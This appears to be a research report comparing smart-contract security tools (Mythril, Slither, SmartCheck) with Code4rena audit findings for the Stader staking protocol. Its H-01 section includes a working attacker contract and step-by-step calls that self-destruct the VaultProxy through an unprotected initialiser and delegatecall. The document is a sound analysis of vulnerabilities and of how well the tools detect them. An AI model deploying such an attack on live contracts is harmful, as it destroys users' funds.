# STADER - Analysis results

# WARDEN REPORT

## High

| Category                                     | REF  | Name                                                                              | Wardens |                                     contract                                     |
|:---------------------------------------------|:----:|:----------------------------------------------------------------------------------|:-------:|:--------------------------------------------------------------------------------:|
| Control-flow Hijack and Suicidal Contract    | H-01 | ```VaultProxy``` implementation can be initialized by anyone and self-destructed  |    5    |                                  VaultProxy.sol                                  |


## Medium

| Category                                     | REF  | Name                                                                                                                            | Wardens |                                     contract                                     |
|:---------------------------------------------|:----:|:--------------------------------------------------------------------------------------------------------------------------------|:-------:|:--------------------------------------------------------------------------------:|
| Inconsistent State Updates                   | M-01 | Risk of losing admin access if ```updateAdmin``` set with same current admin address                                            |    3    |                                 StaderConfig.sol                                 |
| Contract Implementation Specific Bug         | M-02 | ```pause/unpause``` functionalities not implemented in many pausable contracts                                                  |   16    | SocializingPool.sol, StaderOracle.sol, OperatorRewardsCollector.sol, Auction.sol |
| Contract Implementation Specific Bug         | M-03 | Stader OPERATOR is a single point of failure                                                                                    |    1    |                          PermissionlessNodeRegistry.sol                          |
| Assertion failure                            | M-04 | ```updatePoolAddress``` functions always revert when updating existing ```poolId```                                             |    4    |                                  PoolUtils.sol                                   |
| Erroneus Account                             | M-05 | ```StaderOracle``` - Strict equal can cause no consensus if trusted nodes are removed before consensus                          |    1    |                                 StaderOracle.sol                                 |
| Contract Implementation Specific Bug         | M-06 | Protocol will not benefit from slashing mechanism when remaining penalty bigger than ```minThreshold```                         |    3    |                           ValidatorWithdrawalVault.sol                           |
| Control-flow Hijack (frontrun vulnerability) | M-07 | MEV bots can win all the auctions when ```Auction``` is paused                                                                  |    2    |                                   Auction.sol                                    |
| Inconsistent State Updates                   | M-08 | Corruption of oracle data                                                                                                       |    1    |                                 StaderOracle.sol                                 |
| Inconsistent State Updates                   | M-09 | ```depositETHOverTargetWeight()``` malicious modifications ```poolIdArrayIndexForExcessDeposit```                               |    2    |                                 PoolSelector.sol                                 |
| Inconsistent State Updates                   | M-10 | Owner in ```VaultProxy.sol``` is ```address(0)```                                                                               |    6    |                                  VaultProxy.sol                                  |
| Contract Implementation Specific Bugs        | M-11 | ```ValidatorWithdrawalVault.distributeRewards``` can be called to make operator slashable                                       |    1    |                           ValidatorWithdrawalVault.sol                           |
| Erroneus Account                             | M-12 | ```ValidatorWithdrawalVault.settleFunds``` doesn’t check amount that user has inside ```NodeELRewardVault``` to pay for penalty |    1    |                           ValidatorWithdrawalVault.sol                           |
| Block-state Dependency                       | M-13 | No bidder has incentive to bid in the Auction except doing last-minute ```MEV``` due to fixed ```endBlock```                    |    6    |                                   Auction.sol                                    |
| Erroneus Account                             | M-14 | Chainlink’s ```latestRoundData``` may return a stale or incorrect result                                                        |   25    |                                 StaderOracle.sol                                 |


## Vulnerability Description
### H-01 ```VaultProxy``` implementation can be initialized by anyone and self-destructed
This [report](https://code4rena.com/reports/2023-06-stader#h-01-vaultproxy-implementation-can-be-initialized-by-anyone-and-self-destructed) found an attack vector which
an attacker can exploit in order to execute own code inside execution environment of victim (VaultProxy.sol)

#### Attack Vector description
1) Create AttackContract

An attacker creates an attacker contract:
```
contract AttackContract {
    function getValidatorWithdrawalVaultImplementation() public view returns(address) {
        return address(this);
    }
    function getNodeELRewardVaultImplementation() public view returns(address) {
	    return address(this);
    }
    fallback(bytes calldata _input) external payable returns(bytes memory _output) {
	    selfdestruct(address(0));
    }
}
```
2) Initialization

Attacker calls [VaultProxy.initialise()](https://github.com/code-423n4/2023-06-stader/blob/7566b5a35f32ebd55d3578b8bd05c038feb7d9cc/contracts/VaultProxy.sol#L20-L36):
```
function initialise(
        bool _isValidatorWithdrawalVault,
        uint8 _poolId,
        uint256 _id,
        address _staderConfig
    ) external {
        if (isInitialized) {
            revert AlreadyInitialized();
        }
        UtilLib.checkNonZeroAddress(_staderConfig);
        isValidatorWithdrawalVault = _isValidatorWithdrawalVault;
        isInitialized = true;
        poolId = _poolId;
        id = _id;
        staderConfig = IStaderConfig(_staderConfig);
        owner = staderConfig.getAdmin();
    }
```
with this params:
```
initialise(
    False,
    0, (any uint8 is ok)
    0, (any uint8 is ok)
    AttackContract address
)
```
3) Attack trigger

Then, attacker calls a non-existent function of VaultProxy.
This triggers [fallback function of VaultProxy](https://github.com/code-423n4/2023-06-stader/blob/7566b5a35f32ebd55d3578b8bd05c038feb7d9cc/contracts/VaultProxy.sol#L41-L50):
```
fallback(bytes calldata _input) external payable returns (bytes memory) {
        address vaultImplementation = isValidatorWithdrawalVault
            ? staderConfig.getValidatorWithdrawalVaultImplementation()
            : staderConfig.getNodeELRewardVaultImplementation();
        (bool success, bytes memory data) = vaultImplementation.delegatecall(_input);
        if (!success) {
            revert(string(data));
        }
        return data;
    }
```
Due to ```isValidatorWithdrawalVault``` is ```False```, 
```
address vaultImplementation = staderConfig.getNodeELRewardVaultImplementation()
```
but ```staderConfig``` is ```AttackContract``` so
```
address vaultImplementation = address(AttackContract)
```

Then, ```vaultImplementation.delegatecall(_input)``` calls AttackContract.fallback(bytes calldata _input) using VaultProxy storage,
VaultProxy ```msg.sender``` and VaultProxy ```msg.value``` (see [Solidity delegatecall](https://solidity-by-example.org/delegatecall/)).

This means that VaultProxy calls ```selfdestruct(address(0));```, which delete VaultProxy contract and send all Ethers stored inside to address(0) (see [Solidity Self Destruct](https://solidity-by-example.org/hacks/self-destruct/))

#### SWC AND CWE
This vulnerability has been descripted inside [CWE-829](https://cwe.mitre.org/data/definitions/829.html)

This vulnerability has been descripted inside [SWC Registry](https://swcregistry.io/):

[SWC-112 Delegatecall to Untrusted Callee](https://swcregistry.io/docs/SWC-112/)

Mythril [found it](mythril/experiment_1/VaultProxy.md):
```
## Delegatecall to user-supplied address
- SWC ID: 112
- Severity: High
- Contract: VaultProxy
- Function name: `fallback`
- PC address: 528
- Estimated Gas Usage: 4234 - 76512

### Description

The contract delegates execution to another contract with a user-supplied address.
The smart contract delegates execution to a user-supplied address.This could allow an attacker to execute arbitrary code in the context of this contract account and manipulate the state of the contract account or execute actions on its behalf.
In file: contracts/VaultProxy.sol:45

### Code


vaultImplementation.delegatecall(_input)


### Initial State:

Account: [CREATOR], balance: 0x0, nonce:0, storage:{}
Account: [ATTACKER], balance: 0x1, nonce:0, storage:{}

### Transaction Sequence

Caller: [CREATOR], calldata: , decoded_data: , value: 0x0
Caller: [ATTACKER], function: blockHashAddendsInexpansible(uint256), txdata: 0x00000000, value: 0x0
```

### M-01 Risk of losing admin access if ```updateAdmin``` set with same current admin address
This [report](https://code4rena.com/reports/2023-06-stader#m-01-risk-of-losing-admin-access-if-updateadmin-set-with-same-current-admin-address) describes a way which could 
lead to lose admin access inside [StaderConfig.sol](https://github.com/code-423n4/2023-06-stader/blob/7566b5a35f32ebd55d3578b8bd05c038feb7d9cc/contracts/StaderConfig.sol)

#### Description
Wrong use of [updateAdmin(address _admin)](https://github.com/code-423n4/2023-06-stader/blob/7566b5a35f32ebd55d3578b8bd05c038feb7d9cc/contracts/StaderConfig.sol#L176-L183)
function could lead to lose ADMIN ROLE.

```
function updateAdmin(address _admin) external onlyRole(DEFAULT_ADMIN_ROLE) {
        address oldAdmin = accountsMap[ADMIN];

        _grantRole(DEFAULT_ADMIN_ROLE, _admin);
        setAccount(ADMIN, _admin);

        _revokeRole(DEFAULT_ADMIN_ROLE, oldAdmin);
    }
```

```updateAdmin``` can call only by ```DEFAULT_ADMIN_ROLE```.

Let ```admin_0``` be current admin.

If ```admin_0``` calls ```updateAdmin(admin_0)```, ```setAccount()``` will update ```_admin``` inside ```accountsMap```,
but then ```_revokeRole(DEFAULT_ADMIN_ROLE, oldAdmin)``` will remove ```DEFAULT_ADMIN_ROLE``` from ```admin_0```,
and it will not possible to recover it. 

Contract will not have an account with ```DEFAULT_ADMIN_ROLE``` anymore.

#### SWC AND CWE
There is no swc which describes loss of admin role.
We could consider this problem as [CWE-269](https://cwe.mitre.org/data/definitions/269.html)

### M-02 ```pause/unpause``` functionalities not implemented in many pausable contracts
This [report](https://code4rena.com/reports/2023-06-stader#m-02-pauseunpause-functionalities-not-implemented-in-many-pausable-contracts) 
describes lack of ```pause/unpause``` functionalities inside of 
[SocializingPool.sol](https://github.com/code-423n4/2023-06-stader/blob/main/contracts/SocializingPool.sol)
[Auction.sol](https://github.com/code-423n4/2023-06-stader/blob/main/contracts/Auction.sol)
[StaderOracle.sol](https://github.com/code-423n4/2023-06-stader/blob/main/contracts/StaderOracle.sol)
[OperatorRewardsCollector.sol](https://github.com/code-423n4/2023-06-stader/blob/main/contracts/OperatorRewardsCollector.sol#L16)


#### Description
All contracts above inherit from ```PausableUpgradeable```, but they don't implement ```pause/unpause``` functionalities.
This means that in case of Stader needs to pause these contracts, it will not be able to.

#### SWC AND CWE
There is no swc which describes lack of ```pause/unpause``` functionalities.
We don't found any CWE which describes it.
This is not a vulnerability, but it is a wrong way to use ```PausableUpgradeable``` extension.


### M-03 Stader OPERATOR is a single point of failure
This [report](https://code4rena.com/reports/2023-06-stader#m-03-stader-operator-is-a-single-point-of-failure) 
describes a problem inside permission-less pool: OPERATOR role holds too much power.
[PermissionLessNodeRegistry.sol](https://github.com/code-423n4/2023-06-stader/blob/main/contracts/PermissionlessNodeRegistry.sol)
[PermissionedNodeRegistry.sol](https://github.com/code-423n4/2023-06-stader/blob/main/contracts/PermissionedNodeRegistry.sol)


#### Description
OPERATOR role can do this 2 actions:
1) Arbitrary negation of participation makes permissionless pool permissioned. [PermissionlessNodeRegistry.sol#L183](https://github.com/code-423n4/2023-06-stader/blob/main/contracts/PermissionlessNodeRegistry.sol#L183)
2) Authorization of invalid keys [PermissionedNodeRegistry.sol#L254](https://github.com/code-423n4/2023-06-stader/blob/main/contracts/PermissionedNodeRegistry.sol#L254)

Therefore, the pool can't be considered permissioneless and the system is vulnerable
if OPERATOR is comprised

#### SWC AND CWE
There are no swc or cwe to describe this problem.
This is not a vulnerability, but it is a wrong way to build permissionless pool or to give authorization of keys.


### M-04 ```updatePoolAddress``` functions always revert when updating existing ```poolId```
This [report](https://code4rena.com/reports/2023-06-stader#m-04-updatepooladdress-functions-always-revert-when-updating-existing-poolid) 
found that updatePoolAddress always revert if it try to update ```_poolId```.
[PermissionlessNodeRegistry.sol](https://github.com/code-423n4/2023-06-stader/blob/main/contracts/PermissionlessNodeRegistry.sol)


#### Description
[Code of ```updatePoolAddress(uint8 _poolId, address _newPoolAddress)```](https://github.com/code-423n4/2023-06-stader/blob/main/contracts/PoolUtils.sol#L55-L65):

```
function updatePoolAddress(uint8 _poolId, address _newPoolAddress)
        external
        override
        onlyExistingPoolId(_poolId)
        onlyRole(DEFAULT_ADMIN_ROLE)
    {
        UtilLib.checkNonZeroAddress(_newPoolAddress);
        verifyNewPool(_poolId, _newPoolAddress);
        poolAddressById[_poolId] = _newPoolAddress;
        emit PoolAddressUpdated(_poolId, _newPoolAddress);
    }
```

1) we call updatePoolAddress on existing ```_poolId```

```onlyExistingPoolId(_poolId)``` doesn't revert
```verifyNewPool(_poolId, _newPoolAddress)``` revert

2) we call updatePoolAddress on new ```_poolId```

```onlyExistingPoolId(_poolId)``` revert
```verifyNewPool(_poolId, _newPoolAddress)``` doesn't revert

The correct behavior is 2). Anyway, this function always reverts.

#### SWC AND CWE
Mythril doesn't found this problem.
Anyway, there is a SWC:
[SWC-135 Code With No Effects](https://swcregistry.io/docs/SWC-135/)
[CWE 1164](https://cwe.mitre.org/data/definitions/1164.html)


# MYTHRIL REPORT

|              |    Strategy     | Max Depth | Timeout |                       Description file                       |
|:------------:|:---------------:|:---------:|:-------:|:------------------------------------------------------------:|
| experiment 1 |  standard(dfs)  |    22     |  86400  | [experiment_1/_description.md](experiment_1/_description.md) |
| experiment 2 |       dfs       |    200    |  86400  | [experiment_2/_description.md](experiment_2/_description.md) |
| experiment 3 |       bfs       |    150    |  86400  | [experiment_3/_description.md](experiment_3/_description.md) |
| experiment 4 |  naive-random   |    250    |  86400  | [experiment_4/_description.md](experiment_4/_description.md) |
| experiment 5 | weighted-random |   1000    |  86400  | [experiment_5/_description.md](experiment_5/_description.md) |
| experiment 6 |     pending     |    500    |  86400  | [experiment_6/_description.md](experiment_6/_description.md) |

|                           | SLOC | analysis duration (s) | analysis duration (m) | timeout (Y/N) |    High     | Medium | Low | valid finds |
|:--------------------------|:----:|:---------------------:|:---------------------:|:-------------:|:-----------:|:------:|:---:|:-----------:|
| experiment 1              | 4334 |        113834         |         1897          |               | 35 (33 IAB) |   1    | 28  |      2      |
| experiment 2              | 4334 |        137653         |         2294          |               | 33 (31 IAB) |   1    | 25  |      2      |
| experiment 3              | 4334 |        175376         |         2923          |               | 44 (42 IAB) |   1    | 27  |      2      |
| experiment 4              | 4334 |        175646         |         2927          |               | 38 (36 IAB) |   1    | 28  |      2      |
| experiment 5              | 4334 |        177329         |         2955          |               | 37 (35 IAB) |   1    | 27  |      2      |
| experiment 6              | 4334 |        174345         |         2906          |               | 38 (36 IAB) |   1    | 27  |      2      |
| Unique finds and averages | 4334 |        159030         |         2650          |               | 44 (42 IAB) |   1    | 28  |      2      |


# SLITHER REPORT
|                                 | SLOC | analysis duration (s) | High | Medium | Low | valid finds |
|:-------------------------------:|:----:|:---------------------:|:----:|:------:|:---:|:-----------:|
|          Auction.json           | 116  |         4.58          |  0   |   20   |  3  |      0      |
|            ETHx.json            |  50  |         4.71          |  0   |   18   |  0  |      0      |
|     NodeELRewardVault.json      |  32  |         2.48          |  0   |   10   |  1  |      0      |
|  OperatorRewardsCollector.json  |  39  |         4.08          |  0   |   18   |  1  |      0      |
|          Penalty.json           | 106  |         4.37          |  0   |   18   |  5  |     2L      |
|  PermissionedNodeRegistry.json  | 524  |         6.65          |  0   |   31   | 11  |      0      |
|      PermissionedPool.json      | 252  |         5.62          |  1   |   29   | 17  |      0      |
| PermissionlessNodeRegistry.json | 502  |         6.24          |  4   |   23   | 13  |      0      |
|     PermissionlessPool.json     | 216  |         5.38          |  1   |   28   | 11  |      0      |
|        PoolSelector.json        | 108  |         4.74          |  0   |   27   |  2  |      0      |
|         PoolUtils.json          | 232  |          4.5          |  0   |   20   |  6  |      0      |
|        SDCollateral.json        | 172  |         5.17          |  0   |   27   |  2  |      0      |
|      SocializingPool.json       | 180  |         5.29          |  2   |   20   |  2  |     1L      |
|        StaderConfig.json        | 374  |         5.04          |  0   |   18   |  0  |      0      |
|    StaderInsuranceFund.json     |  52  |         4.12          |  1   |   19   |  0  |      0      |
|        StaderOracle.json        | 589  |          6.0          |  0   |   22   |  0  |      0      |
|  StaderStakePoolsManager.json   | 213  |         6.63          |  1   |   32   |  4  |      0      |
|   UserWithdrawalManager.json    | 176  |         6.39          |  0   |   28   |  3  |     1L      |
|          UtilLib.json           | 143  |          2.4          |  0   |   9    |  0  |      0      |
|      ValidatorStatus.json       |  9   |         1.74          |  0   |   0    |  0  |      0      |
|  ValidatorWithdrawalVault.json  | 125  |         3.47          |  1   |   19   |  4  |     1L      |
|        VaultFactory.json        |  77  |         4.45          |  1   |   18   |  4  |     2L      |
|         VaultProxy.json         |  56  |         2.51          |  1   |   9    |  1  |    1H 1L    |
|             OVERALL             | 4343 |        106.56         |  13  |  463   | 90  |    1H 8L    |
|       UNIQUE VALID FINDS        |      |                       |      |        |     |    1H 1L    |

## Valid finds
### High
#### controlled-delegatecall
Reported as high in [[H-01] VaultProxy implementation can be initialized by anyone and self-destructed](https://github.com/code-423n4/2023-06-stader-findings/issues/418)
Find in VaultProxy.sol

### Low
#### reentrancy-events
Reported as not-critical in [Bot report - N-12](https://gist.github.com/CloudEllie/9a06bd326750de18279979886ed93ffd#n12-events-may-be-emitted-out-of-order-due-to-reentrancy)
Find in UserWithdrawalManager.sol
#### missing-zero-check
Reported as low in [Bot report - L-03](https://gist.github.com/CloudEllie/9a06bd326750de18279979886ed93ffd#l03-missing-checks-for-address0x0-when-assigning-values-to-address-state-variables)
Finds in Penalty.sol (x2), SocializingPool.sol, ValidatorWithdrawalVault.sol, VaultFactory.sol (x2), VaultProxy.sol

### Other finds
Other finds are valid, but we consider them as not-critical


# SMARTCHECK REPORT
|                            | SLOC | High | Medium | Low  | valid finds |
|:--------------------------:|:----:|:----:|:------:|:----:|:-----------:|
|          Auction           | 116  |  0   |   0    | 173  |      0      |
|            ETHx            |  50  |  0   |   1    | 140  |      0      |
|     NodeELRewardVault      |  32  |  0   |   0    | 122  |      0      |
|  OperatorRewardsCollector  |  39  |  2   |   0    | 130  |      0      |
|          Penalty           | 106  |  0   |   1    | 206  |      0      |
|  PermissionedNodeRegistry  | 524  |  1   |   1    | 180  |      0      |
|      PermissionedPool      | 252  |  0   |   0    | 184  |      0      |
| PermissionlessNodeRegistry | 502  |  0   |   0    | 197  |      0      |
|     PermissionlessPool     | 216  |  0   |   0    | 182  |      0      |
|        PoolSelector        | 108  |  0   |   2    | 146  |      0      |
|         PoolUtils          | 232  |  0   |   1    | 143  |      0      |
|        SDCollateral        | 172  |  0   |   0    | 243  |      0      |
|      SocializingPool       | 180  |  0   |   2    | 212  |      0      |
|        StaderConfig        | 374  |  0   |   0    | 133  |      0      |
|    StaderInsuranceFund     |  52  |  1   |   0    | 138  |      0      |
|        StaderOracle        | 589  |  0   |   2    | 228  |      0      |
|  StaderStakePoolsManager   | 213  |  0   |   1    | 284  |      0      |
|   UserWithdrawalManager    | 176  |  5   |   1    | 265  |      0      |
|          UtilLib           | 143  |  0   |   0    |  98  |      0      |
|      ValidatorStatus       |  9   |  0   |   0    |  0   |      0      |
|  ValidatorWithdrawalVault  | 125  |  1   |   0    | 150  |      0      |
|        VaultFactory        |  77  |  1   |   0    | 147  |      0      |
|         VaultProxy         |  56  |  1   |   0    | 109  |    1H 1L    |
|          OVERALL           | 4343 |  12  |   12   | 3810 |    1H 1L    |
|     UNIQUE VALID FINDS     |      |      |        |      |     1H      |


## Valid finds
### High
#### SOLIDITY_UNCHECKED_CALL
Reported as high in [[H-01] VaultProxy implementation can be initialized by anyone and self-destructed](https://github.com/code-423n4/2023-06-stader-findings/issues/418)
Find in VaultProxy.sol

### Low
#### SOLIDITY_PRAGMAS_VERSION
(See [Bot report: [N‑29] Non-library/interface files should use fixed compiler versions, not floating ones](https://gist.github.com/CloudEllie/9a06bd326750de18279979886ed93ffd#n29-non-libraryinterface-files-should-use-fixed-compiler-versions-not-floating-ones))
reported as not critical in bot report
Find in VaultProxy.sol

# BOT REPORT

## HIGH
No high in bot report

## MEDIUM
| C4 Severity | REF  | Name                                                                    |    contract     |
|:-----------:|:----:|:------------------------------------------------------------------------|:---------------:|
|   Medium    | M-01 | The ```owner``` is a single point of failure and a centralization risk  | VaultProxy.sol  |


# COMPARISON

```Vulnerability found: Y``` means
1) Mythril found the vulnerability and describes vector attack, or
2) Mythril found a part of code and indicates enough information to lead to exploit/report vulnerability.

## COMPARISON BETWEEN MYTHRIL REPORT AND WARDEN REPORT

### HIGH
|  REF  |    contract    | vulnerability found by Mythril (Y/N) |
|:-----:|:--------------:|:------------------------------------:|
| H-01  | VaultProxy.sol |                  Y                   |

### MEDIUM
| REF  |                                     contract                                     | vulnerability found by Mythril (Y/N) |
|:----:|:--------------------------------------------------------------------------------:|:------------------------------------:|
| M-01 |                                 StaderConfig.sol                                 |                  N                   |
| M-02 | SocializingPool.sol, StaderOracle.sol, OperatorRewardsCollector.sol, Auction.sol |                  N                   |
| M-03 |                          PermissionlessNodeRegistry.sol                          |                  N                   |
| M-04 |                                  PoolUtils.sol                                   |                  N                   |
| M-05 |                                 StaderOracle.sol                                 |                  N                   |
| M-06 |                           ValidatorWithdrawalVault.sol                           |                  N                   |
| M-07 |                                   Auction.sol                                    |                  N                   |
| M-08 |                                 StaderOracle.sol                                 |                  N                   |
| M-09 |                                 PoolSelector.sol                                 |                  N                   |
| M-10 |                                  VaultProxy.sol                                  |                  N                   |
| M-11 |                           ValidatorWithdrawalVault.sol                           |                  N                   |
| M-12 |                           ValidatorWithdrawalVault.sol                           |                  N                   |
| M-13 |                                   Auction.sol                                    |                  Y                   |
| M-14 |                                 StaderOracle.sol                                 |                  N                   |


## COMPARISON BETWEEN MYTHRIL REPORT AND BOT REPORT

### MEDIUM
| REF  |    contract    | vulnerability found  by Mythril(Y/N) |
|:----:|:--------------:|:------------------------------------:|
| M-01 | VaultProxy.sol |                  N                   |


